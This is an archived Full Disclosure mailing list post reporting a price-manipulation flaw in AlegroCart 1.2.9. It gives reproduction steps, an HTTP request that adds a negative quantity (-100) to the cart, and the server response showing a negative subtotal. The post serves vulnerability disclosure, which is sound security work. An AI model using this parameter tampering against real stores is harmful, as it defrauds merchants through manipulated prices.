---
title: Business Logic Flaw: Price Manipulation - AlegroCartv1.2.9
url: https://seclists.org/fulldisclosure/2025/Apr/22
source: Full Disclosure
date: 2025-04-25
fetch_date: 2025-10-06T22:08:10.815774
---

# Business Logic Flaw: Price Manipulation - AlegroCartv1.2.9

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

![](/shared/images/nst-icons.svg#search)

# Business Logic Flaw: Price Manipulation - AlegroCartv1.2.9

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Wed, 23 Apr 2025 22:11:47 +0100

---

```
# Exploit Title: Business Logic Flaw: Price Manipulation - alegrocartv1.2.9
# Date: 04/2025
# Exploit Author: Andrey Stoykov
# Version: 1.2.9
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Business Logic Flaw: Price Manipulation #1:

Steps to Reproduce:

1. Visit the store and add a product
2. Intercept the HTTP GET request and add negative value to the "quantity"
parameter

// HTTP GET request

GET
/alegrocart/index.php?controller=addtocart&action=add&item=10&quantity=-100
HTTP/1.1
Host: 192.168.58.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0)
Gecko/20100101 Firefox/138.0
[...]

// HTTP response

HTTP/1.1 200 OK
Date: Thu, 03 Apr 2025 22:16:58 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Cache-Control: max-age=0, private, no-store, no-cache, must-revalidate
Expires: Thu, 03 Apr 2025 22:16:58 GMT
Vary: Accept-Encoding
Content-Length: 813
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<div class="headingcolumn pointer" onclick="ShowCart()"><h3>Cart
 ^</h3></div>
<div  class="cart">
<div id="cart_content" class="cart_content">
<div id="cart_products">
<table>
<tr>
<td>-100&nbsp;x&nbsp;</td>
<td class="ff"><a href="
http://192.168.58.129/alegrocart/?controller=product&amp;product_id=10
">Featured13/8&quot;&amp;1/2&quot;</a></td>
<td class="ee"> $-1,599.00</td>
</tr>
</table>
</div>
<div class="aa">Subtotal:$-1,599.00</div>
<div class="cc">1 Product(s) - <div class="dd">-100 Item(s)</div></div>
<div class="bb" id="cart_button"><a href="
http://192.168.58.129/alegrocart/?controller=cart";>View Cart</a></div>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

### Current thread:

* **Business Logic Flaw: Price Manipulation - AlegroCartv1.2.9** *Andrey Stoykov (Apr 23)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")